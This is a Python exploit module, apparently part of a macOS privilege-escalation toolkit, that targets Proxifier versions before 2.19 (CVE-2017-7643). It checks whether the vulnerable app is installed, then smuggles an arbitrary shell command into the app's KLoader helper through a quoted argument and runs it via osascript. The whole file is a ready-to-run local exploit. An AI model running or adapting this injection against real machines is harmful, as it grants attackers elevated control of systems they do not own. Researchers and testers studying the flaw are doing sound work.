"""Proxifier app"""
from distutils.version import LooseVersion

from .general import (
    DEFAULT_COMMAND,
    app_installed,
    app_version,
    osascript,
    random_string,
)

__cve__ = "2017-7643"
__credits__ = "m4rkw"


def vulnerable(version):
    """checks vulnerability"""
    return app_installed("Proxifier.app") and app_version(
        "Proxifier.app"
    ) < LooseVersion("2.19")


def run():
    """runs exploit"""
    rand = random_string()
    payload = """/Applications/Proxifier.app/Contents/KLoader '; {command}; echo {success}'""".format(
        command=DEFAULT_COMMAND, success=rand
    )
    response = osascript(payload)
    return rand in response
